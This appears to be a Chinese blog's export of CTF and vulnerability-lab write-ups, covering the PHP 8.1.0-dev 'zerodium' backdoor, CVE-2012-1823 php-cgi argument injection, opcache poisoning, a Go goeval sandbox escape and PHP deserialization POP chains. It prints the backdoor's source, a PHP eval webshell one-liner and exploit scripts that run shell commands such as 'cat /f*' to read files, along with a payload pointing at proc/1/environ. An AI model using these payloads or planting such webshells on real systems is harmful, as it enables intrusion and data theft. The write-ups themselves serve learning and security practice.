&quot;password&quot;:&quot;pass&quot;, &quot;__class__&quot;:{ &quot;check&quot;:{ &quot;__globals__&quot;:{ &quot;__file__&quot;:&quot;proc/1/environ&quot; } } }}","link":"/2024/03/29/buuctf/buu2/"},{"title":"81backdoor","text":"8.1.0 php后门一个简单的复现利用docker搭建起来后只有一句话 抓个包看看有没有什么东西 丢到repeater后发包也没看到有什么 根据提示，可以在请求头部加User-Agentt: zerodiumvar_dump(2*3); 可以远程命令执行 漏洞成因2021年PHP Git仓库遭到入侵，攻击者在PHP源码中植入了恶意代码，这种恶意代码是被攻击者伪装成开发者或维护者的身份来进行提交，实际效果是植入了一个远程RCE后门。它会通过检查HTTP头中的字符串，如果是以zerodium开头，则会触发后门，执行php代码 12345678910111213{ zval zoh; php_output_handler *h; zval *enc; if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL(&quot;_SERVER&quot;))) &amp;&amp; (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), &quot;HTTP_USER_AGENTT&quot;, sizeof(&quot;HTTP_USER_AGENTT&quot;) - 1))) { convert_to_string(enc); if (strstr(Z_STRVAL_P(enc), &quot;zerodium&quot;)) { zend_try { zend_eval_string(Z_STRVAL_P(enc)+8, NULL, &quot;REMOVETHIS: sold to zerodium, mid 2017&quot;); } zend_end_try(); } } 这里攻击者用了一个让人混淆的HTTP_USER_AGENTT头，zend_try和zend_end_try用于异常处理，即使执行的代码有问题也不会造成php的崩溃 在strstr(Z_STRVAL_P(enc), &quot;zerodium&quot;)中，strstr()函数用于查找第一个字符串中是否有包含第二个字符串，如果有，就返回后者在前者第一次出现的位置的指针，没有就返回NULL； Z_STRVAL_P(enc)了解一下就行，它是PHP扩展开发中的一个宏，用于从zval结构体变量中提取字符串 :::info zval结构体构成比较复杂，感兴趣的可以点击这里 ::: zend_eval_string()相当于eval()，第二个变量用于接受执行结果，NULL则表示不关心执行结果 [:heavy_check_mark:get一点]{.label .success}看似代码长，实际上仔细分析之后也就那样，函数执行什么功能一般就会以什么功能的单词命名，还算好理解的","link":"/2024/03/19/vulhub/81backdoor/"},{"title":"CVE-2012-1823复现","text":"CVE-2012-1823简单复现 根据提示，可以进入index.php看看有没有什么信息 并没有存在什么信息，根据提示，当输入/index.php?-s时会暴露后端源码 漏洞全貌大概就这样 漏洞成因先引入一个概念和它引申的分支 什么是CGI(:confused:)Common Gateway Interface，即通用网关接口，它是一个Web服务器主机提供信息服务的标准接口，Web服务器通过这个接口来获取客户端提交的信息，然后转交给服务端的CGI程序处理，最后再返回给客户端。 PHP-CGI它是一个用于处理PHP脚本的可执行文件。该文件使用CGI来与WEB服务器通信，在接收HTTP请求的同时处理PHP脚本，然后再将结果返回给WEB服务器 SAPI是什么Server Application Programming Interface，服务器应用编程接口，实际上它定义了一个统一的接口，提供了外部应用与PHP通信交互的管道，Apache的mod_php和常见的fpm（用于管理FastCGI后端的进程）都是SAPI，这里我们要说的php-cgi也是一种SAPI 进入正题直接成因用户请求的querystring被作为了php-cgi的参数，并导致了一些结果 :::info querystring，即查询字符串，它是url的一部分，用于传递其他参数和数据，www.example.com/?key=value中，querystring为?后面的一部分 ::: 深究一下看了看其他大佬的文章，发现CGI有如下参数 12345678910111213141516171819SERVER_SOFTWARE：运行服务器的名称和版本。SERVER_NAME：服务器的主机名、域名或IP地址。GATEWAY_INTERFACE：CGI规范的版本。SERVER_PROTOCOL：请求使用的协议名称和版本，例如HTTP/1.1。SERVER_PORT：服务器接收请求的端口号。REQUEST_METHOD：请求使用的方法，例如GET、POST。PATH_INFO：脚本后的额外路径信息，用于传递给脚本。PATH_TRANSLATED：根据PATH_INFO转换后的实际路径。SCRIPT_NAME：脚本的虚拟路径。QUERY_STRING：URL中问号（?）后面的查询字符串。REMOTE_HOST：发出请求的客户端主机名。REMOTE_ADDR：发出请求的客户端IP地址。REMOTE_USER：服务器进行认证后，认定的用户名称。REMOTE_IDENT：用户的HTTP身份信息，如果HTTP服务器支持RFC 1413。CONTENT_TYPE：对于POST请求，数据的内容类型。CONTENT_LENGTH：对于POST请求，数据的长度。HTTP_ACCEPT：客户端接受的MIME类型。HTTP_USER_AGENT：发出请求的客户端浏览器的标识字符串。HTTP_COOKIE：客户端发送的Cookie。 根据RFC3875对Command Line的描述： Some systems support a method for supplying an array of strings to the CGI script.This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded &quot;=&quot; characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules 大致意思是querystring中如果不包含未编码的=。就会把querystring作为cgi的参数传入 如何利用CGI模式下有几个参数可以用： -c 指定php.ini文件的位置 -n 不要加载php.ini文件 -d 指定配置项 -b 启动fastcgi进程 -s 显示文件源码 -T 执行指定次该文件 -h和-? 显示帮助 由于我们是在CGI模式下复现的，因此可以直接传递参数，效果已经在前面展示过了 还有一种用法就是通过-d来实现getshell，例如把文件包含功能打开，用文件包含漏洞 总结实际上还是远程命令执行漏洞，攻破命令这一关之后用什么啥方法都行:laughing: 其他可以了解的CGI的工作原理 根据net发送请求给服务器，服务器接收请求； 服务器将请求发送给CGI程序处理； CGI程序将处理好的结果发送给服务器； 服务器接收结果后将其发送给用户。 FastCGI它是在原有的CGI上优化出来的产物。由于进程的创建和调度都需要一定的消耗，进程数量有限，因此基于CGI模式运行的网站一般不能接收大量请求，否则每个进程创造出来的子进程可能会导致服务器被挤爆或者瘫痪。FastCGI相较于原来的CGI，它更像是一种常驻型程序，减少了在进程创建和销毁方面的消耗，提高了处理Web请求的效率。 这个漏洞只出现在CGI运行模式中（如果我没记错的话:confounded:）","link":"/2024/03/19/vulhub/CVE-2012-1823/"},{"title":"buu做题记录（1）","text":":::warning no-icon 做题记录如下 buu1 -&gt; buu2 ::: WEB[DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php根据提示，可以传LuckyE变量，它的值可以试试show_source 看似是反序列化，但咱无法getshell，因为就算能够成功也只是执行函数 根据提示，进入siranai.php 发现是一个文件上传 由于有对$_SERVER['REMOTE_ADDR']的检测，所以直接抓包伪造绕过不太现实，只能考虑SSRF 分析后面代码，发现可以上传压缩包并且可以解压，但是它是放置在tmp目录下的临时文件，因此文件名注入命令行不通 可以考虑OPCACHE缓存文件来进行RCE（我并不会，因为听都没听过:sob:） 啥是OPCACHE呢:confused:它是一个PHP扩展，通过保存预编译的脚本字节码到共享内存中来提高PHP的执行效率，减少了每次加载和编译PHP脚本的开销 先进入到phpinfo()看看opcache_file_cache_only有没有开 反序列化脚本如下： 123456789&lt;?phpclass siroha{ public $koi = array(&quot;zhanjiangdiyishenqing&quot;=&gt;&quot;phpinfo&quot;);}$a = new siroha();echo serialize($a);?&gt; 结果为O:6:&quot;siroha&quot;:1:{s:3:&quot;koi&quot;;a:1:{s:21:&quot;zhanjiangdiyishenqing&quot;;s:7:&quot;phpinfo&quot;;}} 相关设置是开着的，可以直接上手 如何拉一个配置大致相同的镜像这里我们插入一段小插曲，因为这里对后面的解题很重要 官方的镜像在这里，找到8.2.10就行（如果找不到可以问问gpt8.2.10镜像的名字是啥，不过一般都是php:版本号-cli） dockerfile如下： 1234567891011121314151617181920212223242526FROM php:8.2.10-cli# 安装 Opcache 扩展RUN docker-php-ext-install opcache# 配置 OpcacheRUN { \\ echo 'opcache.memory_consumption=128'; \\ echo 'opcache.interned_strings_buffer=8'; \\ echo 'opcache.max_accelerated_files=4000'; \\ echo 'opcache.revalidate_freq=2'; \\ echo 'opcache.fast_shutdown=1'; \\ echo 'opcache.enable_cli=1'; \\} &gt; /usr/local/etc/php/conf.d/opcache-recommended.ini# 创建 Opcache 缓存目录RUN mkdir -p /var/www/cache/opcache &amp;&amp; chown -R www-data:www-data /var/www/cache/opcache# 添加自定义配置文件，这样就可以不用修改php.ini了COPY opcache.ini $PHP_INI_DIR/conf.d/WORKDIR /var/www/htmlCOPY . /var/www/htmlCMD [ &quot;php&quot;, &quot;-S&quot;, &quot;0.0.0.0:8000&quot; ] opcache.ini文件如下 1234opcache.enable=1opcache.file_cache_only=1# 指定缓存目录opcache.file_cache=/var/www/cache/opcache 同目录下可以写一个内容为&lt;? phpinfo();?&gt;的index.php，这样可以方便查看需要的功能有没有打开之类的 :::warning 打开opcache后必须要指定缓存目录，否则容器会启动失败 ::: 做完这些后直接跑docker，看看能否正常运行 ok，可以进入容器内部寻找我们需要的东西了 这里index.php.bin文件是index.php的编译缓存，作用前面说过，不多赘述 我们先看看题目上的时间戳是多少 然后转换为十六进制，把文件拖入010改一下 怎么计算systemid先说说为什么要计算systemid :::danger no-icon 计算 System ID 通常是为了确保攻击者生成的恶意 Opcache 缓存文件与目标系统的 Opcache 配置兼容。每个系统的 Opcache 配置可能不同，包括文件路径、权限等，而 System ID 可能被用作确保缓存文件与特定系统设置相匹配的一种方式。 ::: 根据其他博客和官方wp，大致可以得出systemid有以下几部分 PHP Version Zend Extension ID Zend Bin ID php的官方源码中也有，可以去看看zend_system_id.c 1234567891011121314void zend_startup_system_id(void){ PHP_MD5Init(&amp;context); PHP_MD5Update(&amp;context, PHP_VERSION, sizeof(PHP_VERSION)-1); PHP_MD5Update(&amp;context, ZEND_EXTENSION_BUILD_ID, sizeof(ZEND_EXTENSION_BUILD_ID)-1); PHP_MD5Update(&amp;context, ZEND_BIN_ID, sizeof(ZEND_BIN_ID)-1); if (strstr(PHP_VERSION, &quot;-dev&quot;) != 0) { /* Development versions may be changed from build to build */ PHP_MD5Update(&amp;context, __DATE__, sizeof(__DATE__)-1); PHP_MD5Update(&amp;context, __TIME__, sizeof(__TIME__)-1); } zend_system_id[0] = '\\0';} 由题目可知 PHP Version = 8.2.10，Zend Extension ID = API420220829,NTS，Zend Bin ID = BIN_48888 实际上可以用一个工具，php7-opcache-override-master 得出systemid后，就可以生成一个tar压缩包了 在题目的phpinfo()我们可以看到系统指定的缓存目录为/tmp，这里就用python来SSRF了 123456789101112131415161718192021222324252627282930313233import binasciiimport hashlibimport requestsimport reimport tarfileimport subprocessimport ossys_id = '00c2d2752120e3de9b90bf0eb5fcfcb9'def tar_file(): tar_filename = 'exp.tar' with tarfile.open(tar_filename,'w') as tar: directory_info = tarfile.TarInfo(name=f'{sys_id}/var/www/html') directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add('index.php.bin', arcname=f'{sys_id}/var/www/html/index.php.bin')tar_file()url = 'http://b6361428-f413-4d94-b4d3-0d5932e326ca.node5.buuoj.cn:81/?LuckyE=show_source'def upload(): file = {&quot;file&quot;:(&quot;exp.tar&quot;,open(&quot;exp.tar&quot;,&quot;rb&quot;).read(),&quot;application/x-tar&quot;)} res = requests.post(url=url,files=file) print(res.request.headers) return res.requestrequest_content = upload()upload_body = str(request_content.body).replace(&quot;\\&quot;&quot;,&quot;\\\\\\&quot;&quot;)content_length = request_content.headers['Content-Length']print(content_length)print(upload_body) 然后把报文的body部分复制到SoapClient里面进行报文伪造 不过后面复现失败了，暂时找不到原因，先放着（伪造的脚本可以去看看官方文档） [VNCTF2023]电子木鱼这道题考的是rust整数溢出，当rust某一个数值超过它所规定的范围后，如果是在release模式下运行，程序就不会报错，而是以环绕的形式展现出结果。例如u8是指无符号数八位，范围为[0,255]，如果一个数为255，后面再加1输出，那么这个时候程序返回的就是0，就是从终到始。相应的，如果是0减1，那么返回的就是255，就是从始到终。 题目给了一个压缩包，我们重点看main.rs 拿到flag的条代码是 12345678910111213141516171819#[get(&quot;/&quot;)]async fn index(tera: web::Data&lt;Tera&gt;) -&gt; Result&lt;HttpResponse, Error&gt; { let mut context = Context::new(); context.insert(&quot;gongde&quot;, &amp;GONGDE.get()); if GONGDE.get() &gt; 1_000_000_000 { context.insert( &quot;flag&quot;, &amp;std::env::var(&quot;FLAG&quot;).unwrap_or_else(|_| &quot;flag{test_flag}&quot;.to_string()), ); } match tera.render(&quot;index.html&quot;, &amp;context) { Ok(body) =&gt; Ok(HttpResponse::Ok().body(body)), Err(err) =&gt; Err(error::ErrorInternalServerError(err)), }} 我们需要功德大于1000000000才能拿到flag 观察/upgrade路由 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#[post(&quot;/upgrade&quot;)]async fn upgrade(body: web::Form&lt;Info&gt;) -&gt; Json&lt;APIResult&gt; { if GONGDE.get() &lt; 0 { return web::Json(APIResult { success: false, message: &quot;功德都搞成负数了，佛祖对你很失望&quot;, }); } if body.quantity &lt;= 0 { return web::Json(APIResult { success: false, message: &quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;, }); } if let Some(payload) = PAYLOADS.iter().find(|u| u.name == body.name) { let mut cost = payload.cost; if payload.name == &quot;Donate&quot; || payload.name == &quot;Cost&quot; { cost *= body.quantity; } if GONGDE.get() &lt; cost as i32 { return web::Json(APIResult { success: false, message: &quot;功德不足&quot;, }); } if cost != 0 { GONGDE.set(GONGDE.get() - cost as i32); } if payload.name == &quot;Cost&quot; { return web::Json(APIResult { success: true, message: &quot;小扣一手功德&quot;, }); } else if payload.name == &quot;CCCCCost&quot; { return web::Json(APIResult { success: true, message: &quot;功德都快扣没了，怎么睡得着的&quot;, }); } else if payload.name == &quot;Loan&quot; { return web::Json(APIResult { success: true, message: &quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;, }); } else if payload.name == &quot;Donate&quot; { return web::Json(APIResult { success: true, message: &quot;好人有好报&quot;, }); } else if payload.name == &quot;Sleep&quot; { return web::Json(APIResult { success: true, message: &quot;这是什么？床，睡一下&quot;, }); } } web::Json(APIResult { success: false, message: &quot;禁止开摆&quot;, })} 这里发现当你要“Donate”或“Cost”时，cost的值会乘上你发送的quantity 在PAYLOADS中，有关cost的值如下： 1234567891011121314151617181920212223const PAYLOADS: &amp;[Payload] = &amp;[ Payload { name: &quot;Cost&quot;, cost: 10, }, Payload { name: &quot;Loan&quot;, cost: -1_000, }, Payload { name: &quot;CCCCCost&quot;, cost: 500, }, Payload { name: &quot;Donate&quot;, cost: 1, }, Payload { name: &quot;Sleep&quot;, cost: 0, },]; 根据这些信息，可以利用先求功德，后减功德来达到整数溢出的目的，这里cost已经表明范围了，是有符号的32位数 即-2147483648~2147483647 根据前面说的，只要我们功德扣的够多，就能够达到整数溢出，不然就会报功德不足 然后扣（注意这里quantity并不是无限大，它也是需要在i32范围内的） 得出来的这个数就是（1000-quantity*10）。这里10是指name=Cost时cost的值，payload里面有的，quantity就是你传的数了 成功造成整数溢出 [VNCTF2023]BabyGo给了一个文件，只有main.go值得分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135package mainimport ( &quot;encoding/gob&quot; &quot;fmt&quot; &quot;github.com/PaulXu-cn/goeval&quot; &quot;github.com/duke-git/lancet/cryptor&quot; &quot;github.com/duke-git/lancet/fileutil&quot; &quot;github.com/duke-git/lancet/random&quot; &quot;github.com/gin-contrib/sessions&quot; &quot;github.com/gin-contrib/sessions/cookie&quot; &quot;github.com/gin-gonic/gin&quot; &quot;net/http&quot; &quot;os&quot; &quot;path/filepath&quot; &quot;strings&quot;)type User struct { Name string Path string Power string}func main() { r := gin.Default() store := cookie.NewStore(random.RandBytes(16)) r.Use(sessions.Sessions(&quot;session&quot;, store)) r.LoadHTMLGlob(&quot;template/*&quot;) r.GET(&quot;/&quot;, func(c *gin.Context) { userDir := &quot;/tmp/&quot; + cryptor.Md5String(c.ClientIP()+&quot;VNCTF2023GoGoGo~&quot;) + &quot;/&quot; session := sessions.Default(c) session.Set(&quot;shallow&quot;, userDir) session.Save() fileutil.CreateDir(userDir) gobFile, _ := os.Create(userDir + &quot;user.gob&quot;) user := User{Name: &quot;ctfer&quot;, Path: userDir, Power: &quot;low&quot;} encoder := gob.NewEncoder(gobFile) encoder.Encode(user) if fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+&quot;user.gob&quot;) { c.HTML(200, &quot;index.html&quot;, gin.H{&quot;message&quot;: &quot;Your path: &quot; + userDir}) return } c.HTML(500, &quot;index.html&quot;, gin.H{&quot;message&quot;: &quot;failed to make user dir&quot;}) }) r.GET(&quot;/upload&quot;, func(c *gin.Context) { c.HTML(200, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;upload me!&quot;}) }) r.POST(&quot;/upload&quot;, func(c *gin.Context) { session := sessions.Default(c) if session.Get(&quot;shallow&quot;) == nil { c.Redirect(http.StatusFound, &quot;/&quot;) } userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot; fileutil.CreateDir(userUploadDir) file, err := c.FormFile(&quot;file&quot;) if err != nil { c.HTML(500, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;no file upload&quot;}) return } ext := file.Filename[strings.LastIndex(file.Filename, &quot;.&quot;):] // 被过滤的文件 if ext == &quot;.gob&quot; || ext == &quot;.go&quot; { c.HTML(500, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;Hacker!&quot;}) return } filename := userUploadDir + file.Filename if fileutil.IsExist(filename) { fileutil.RemoveFile(filename) } err = c.SaveUploadedFile(file, filename) if err != nil { c.HTML(500, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;failed to save file&quot;}) return } c.HTML(200, &quot;upload.html&quot;, gin.H{&quot;message&quot;: &quot;file saved to &quot; + filename}) }) r.GET(&quot;/unzip&quot;, func(c *gin.Context) { session := sessions.Default(c) if session.Get(&quot;shallow&quot;) == nil { c.Redirect(http.StatusFound, &quot;/&quot;) } userUploadDir := session.Get(&quot;shallow&quot;).(string) + &quot;uploads/&quot; files, _ := fileutil.ListFileNames(userUploadDir) destPath := filepath.Clean(userUploadDir + c.Query(&quot;path&quot;)) // 解压路径为/tmp/xxxxxxxxxx/uploads/path，其中path可控 for _, file := range files { if fileutil.MiMeType(userUploadDir+file) == &quot;application/zip&quot; { err := fileutil.UnZip(userUploadDir+file, destPath) if err != nil { c.HTML(200, &quot;zip.html&quot;, gin.H{&quot;message&quot;: &quot;failed to unzip file&quot;}) return } fileutil.RemoveFile(userUploadDir + file) } } c.HTML(200, &quot;zip.html&quot;, gin.H{&quot;message&quot;: &quot;success unzip&quot;}) }) r.GET(&quot;/backdoor&quot;, func(c *gin.Context) { session := sessions.Default(c) if session.Get(&quot;shallow&quot;) == nil { c.Redirect(http.StatusFound, &quot;/&quot;) } userDir := session.Get(&quot;shallow&quot;).(string) if fileutil.IsExist(userDir + &quot;user.gob&quot;) { file, _ := os.Open(userDir + &quot;user.gob&quot;) decoder := gob.NewDecoder(file) var ctfer User decoder.Decode(&amp;ctfer) if ctfer.Power == &quot;admin&quot; { eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\\&quot;Good\\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))// 这里pkg也可控，只不过默认值是fmt，可能需要我们去覆盖调用fmt的内容 if err != nil { fmt.Println(err) } c.HTML(200, &quot;backdoor.html&quot;, gin.H{&quot;message&quot;: string(eval)}) return } else { c.HTML(200, &quot;backdoor.html&quot;, gin.H{&quot;message&quot;: &quot;low power&quot;}) return } } else { c.HTML(500, &quot;backdoor.html&quot;, gin.H{&quot;message&quot;: &quot;no such user gob&quot;}) return } }) r.Run(&quot;:80&quot;)} 分析重点在/upload，/unzip和/backdoor。由于上传文件的类型中不能有.go和.gob，加上有个解压功能，因此可以考虑将恶意代码写入一个go文件后进行压缩，然后再解压到任意路径下，最后获得backdoor的权限实现getshell ==（path可控是因为c.Query(“path”)相当于$_GET[“path”]）== backdoor的权限获取分析/backdoor，发现需要user.gob来进行提权，那就可以考虑能不能覆盖。 注意到/upload中会删除之前存在的同名文件，然后上传新文件，可以利用这点进行覆盖 大致思路清楚了，我们直接上手 怎么生成文件的代码已经给我们了，直接照搬照抄就行 1234567891011121314151617181920package mainimport ( &quot;encoding/gob&quot; &quot;os&quot;)type User struct { Name string Path string Power string}func main() { gobfile, _ := os.Create(&quot;user.gob&quot;) user := User{Name: &quot;ctfer&quot;, Path: &quot;/tmp/c641fceaxxxxxx/&quot;, Power: &quot;admin&quot;} encoder := gob.NewEncoder(gobfile) encoder.Encode(user)} 得到user.gob 压缩后上传并进行解压 去/backdoor看看有没有覆盖成功 成功覆盖 go沙盒逃逸这里先不具体说，目前只需要知道这题目的漏洞点在eval, err := goeval.Eval(&quot;&quot;, &quot;fmt.Println(\\&quot;Good\\&quot;)&quot;, c.DefaultQuery(&quot;pkg&quot;, &quot;fmt&quot;))就可以了。 在go中，系统执行的第一个函数一般是main()，但是init()是个例外，它能在main()之前调用 根据这个，我们就可以写脚本了 12345678910111213141516171819package mainimport ( &quot;fmt&quot; &quot;os/exec&quot;)func init() { // cmd := exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;whoami&quot;) cmd := exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat /f*&quot;) res, err := cmd.CombinedOutput() fmt.Println(err) fmt.Println(string(res))}const ( Message = &quot;fmt&quot;) 但是我们需要的是import (后面的一部分，goeval的源码在这里，可以想想为什么 :::info 实际上在源码的func main()中，传入的包是以依次拼接的形式构成的，而在开始时importStr就已经被定义成了import (了，传入的数据会依次拼接在它后面。所以我们只需要注意怎么闭合符号即可 ::: 提一句，最后一部分加const也是为了闭合后面的”)，然后将其稍微修改一下 1os/exec&quot;%0A&quot;fmt&quot;)%0Afunc%09init()%7B%0Acmd:=exec.Command(&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;cat${IFS}/f*&quot;)%0Ares,err:=cmd.CombinedOutput()%0Afmt.Println(err)%0Afmt.Println(res)%0A}%0Aconst(%0AMessage=&quot;fmt python脚本将ascii码转换为chr即可 [VNCTF2023]象棋王子签到难度的jsfuck，找到对应代码后放到控制台print就行 [DASCTF X GFCTF 2022十月挑战赛！]EasyPOP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133&lt;?phphighlight_file(__FILE__);error_reporting(0);class fine{ private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = &quot;&quot;; die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;); }}class show{ public $ctf; public $time = &quot;Two and a half years&quot;; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time; }}class sorry{ private $name; private $password; public $hint = &quot;hint is depend on you&quot;; public $key; public function __construct($name, $password) { $this-&gt;name = $name; $this-&gt;password = $password; } public function __sleep() { $this-&gt;hint = new secret_code(); } public function __get($name) { $name = $this-&gt;key; $name(); } public function __destruct() { if ($this-&gt;password == $this-&gt;name) { echo $this-&gt;hint; } else if ($this-&gt;name = &quot;jay&quot;) { secret_code::secret(); } else { echo &quot;This is our code&quot;; } } public function getPassword() { return $this-&gt;password; } public function setPassword($password): void { $this-&gt;password = $password; }}class secret_code{ protected $code; public static function secret() { include_once &quot;hint.php&quot;; hint(); } public function __call($name, $arguments) { $num = $name; $this-&gt;$num(); } private function show() { return $this-&gt;code-&gt;secret; }}if (isset($_GET['pop'])) { $a = unserialize($_GET['pop']); $a-&gt;setPassword(md5(mt_rand()));} else { $a = new show(&quot;Ctfer&quot;); echo $a-&gt;show();} 这里我顺着分析吧，感觉倒着分析比倒着分析要简单 :::warning no-icon __invoke()触发条件是：当尝试以调用函数的方式调用其所在的对象时 __get()触发条件是：当读取一个对象中不可访问或者不存在的属性时 __call()触发条件是：当调用一个对象不存在的属性或者不可访问的方法时 __wakeup()触发条件是：当所在的对象要被反序列化时 __sleep()触发条件是：当所在的对象要被序列化时 ::: 首先，sorry类有__destruct()，入口在这里 由于题目事先设置了一个随机密码，可以用取地址&amp;绕过 12$a-&gt;setPassword(md5(mt_rand())); 然后hint是echo出来的，恰好show类中有__toString()，就顺着它走了 12345public function __toString() { return $this-&gt;ctf-&gt;show(); } 调用了show()，secret_code类有这个函数 1234567891011public function __call($name, $arguments) { $num = $name; $this-&gt;$num(); } private function show() { return $this-&gt;code-&gt;secret; } ==其实show类也有，只不过他没啥用撒:happy:== 但是其他类中没有secret这个变量，有也只是function，猜测这个时候就是要用到__get()了，于是调到sorry类 123456public function __get($name) { $name = $this-&gt;key; $name(); } 这里把$name当成函数调用了，那就是__invoke()了，跳转到fine类 1234567891011public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = &quot;&quot;; die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;); } 注意到这里有__wakeup()，所以在序列化之后还要绕过它，改个参数就好了，比如对象个数啥的 pop链如下： sorry::destruct() -&gt; show::toString()-&gt;secret_show::show()-&gt;sorry::get()-&gt;fine::invoke() 脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass fine{ private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; }}class secret_code{ protected $code; public function __construct($code) { $this-&gt;code = $code; }}class show{ public $ctf;}class sorry{ private $name; private $password; public function __construct() { $this-&gt;name = &amp;$this-&gt;password; $this-&gt;password = 1; }}$a = new sorry();$b = new secret_code($a);$c = new show();$d = new sorry();$a-&gt;key = new fine('system','cat /f*');$c-&gt;ctf = $b;$d-&gt;hint = $c;$str = str_replace(&quot;fine\\&quot;:2&quot;,&quot;fine\\&quot;:3&quot;, serialize($d));echo urlencode($str); :::warning 这里不能直接用序列化后的字符串是因为在php中，属性为protected和private的变量在序列化之后经过url编码时会被加上不可见字符，可以去搜一搜，网上挺多文章的。不过养成习惯，还是最好都用url编码后的字符串交上去 ::: [NewStarCTF 2023 公开赛道]R!C!E!123456789101112&lt;?phphighlight_file(__FILE__);if(isset($_POST['password'])&amp;&amp;isset($_POST['e_v.a.l'])){ $password=md5($_POST['password']); $code=$_POST['e_v.a.l']; if(substr($password,0,6)===&quot;c4d038&quot;){ if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code)){ eval($code); } }} 代码逻辑很简单，非法传参和md5碰撞罢了 MD5这里可以直接爆破 12345678import hashlibdef decode(str1): for i in range(0,500000): if (hashlib.md5(str(i).encode(&quot;UTF-8&quot;)).hexdigest())[0:6] == &quot;c4d038&quot;: print(i) breakdecode(&quot;c4d038&quot;) 爆破出来是114514 非法传参在php版本小于8时，php处理名字带有.、空格、[、]等符号的变量名时，会将第一个符号转化为下划线_，但是不会改变后续的符号 php版本大于8时，php会将所有符号转化为下划线_ 这里我们并不知道php版本，但是根据变量名可以猜测php版本为7.x，因为我们目标的变量名是e_v.a.l，如果php版本大于8，那么在转换的时候会将变量名的符号全部转换为_，这样会导致变量名不一致而导致传参失败 这里在POST时传名字e[.v.a.l 这里的waf相当于一个纸老虎，执行命令tac /f*即可（不确定的可以用find函数） 用find查找flag结果如下： 12345678/sys/devices/platform/serial8250/tty/ttyS2/flags /sys/devices/platform/serial8250/tty/ttyS0/flags /sys/devices/platform/serial8250/tty/ttyS3/flags /sys/devices/platform/serial8250/tty/ttyS1/flags /sys/devices/virtio-mmio-cmdline/virtio-mmio.3/virtio3/net/eth0/flags /sys/devices/virtual/net/lo/flags /usr/include/linux/flat.h /flag [NewStarCTF 2023 公开赛道]EasyLogin打开登录界面，发现并没有注入点，正常注册登录就行 这里出题人做了一个shell，开始时我们进入的是一个聊天程序，你发什么它回你什么 Ctrl+D退出程序 经过搜索发现并没有什么有用的 并且bin中就这几个命令，且根目录只有bin和home 有点一筹莫展了 抓个包看看登录界面 在发包时注意到有一个/passport包 里面似乎有flag，但我们看不到 可能是权限问题？也只能猜猜 之前在注册时发现admin被注册了，试试能不能用弱密码 发现能成功，密码是000000 再重新抓包 302跳转，得到flag [NewStarCTF 2023 公开赛道]Begin of HTTP这里就不多说了，http头的有关描述在官方档案里，放操作 secret看源代码 [NewStarCTF 2023 公开赛道]Begin of Upload一道朴实无华的文件上传，步骤无非就是：写:horse:，抓包，改后缀绕过，访问文件，RCE 这里说一下我为什么传php会成功 可以分析源码 这里这里的检查位于前端，用js写成的，我们用火狐的插件Javascript Switcher直接把js给ban了就行，这样就不会过滤了 :::warning 有的时候，文件上传功能也会用js编写，所以这种工具在使用时要具体情况具体分析 ::: :horse:的路径有了，可直接访问 我这里写:horse:是&lt;?php eval($_POST['cmd']);?&gt; [NewStarCTF 2023 公开赛道]Begin of PHP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phperror_reporting(0);highlight_file(__FILE__);// 可以爆破，也可以数组绕过if(isset($_GET['key1']) &amp;&amp; isset($_GET['key2'])){ echo &quot;=Level 1=&lt;br&gt;&quot;; if($_GET['key1'] !== $_GET['key2'] &amp;&amp; md5($_GET['key1']) == md5($_GET['key2'])){ $flag1 = True; }else{ die(&quot;nope,this is level 1&quot;); }}// 可以数组绕过，具体原因可以去搜搜if($flag1){ echo &quot;=Level 2=&lt;br&gt;&quot;; if(isset($_POST['key3'])){ if(md5($_POST['key3']) === sha1($_POST['key3'])){ $flag2 = True; } }else{ die(&quot;nope,this is level 2&quot;); }}// 依旧是数组绕过，这里主要是构造NULL，使得NULL == 0if($flag2){ echo &quot;=Level 3=&lt;br&gt;&quot;; if(isset($_GET['key4'])){ 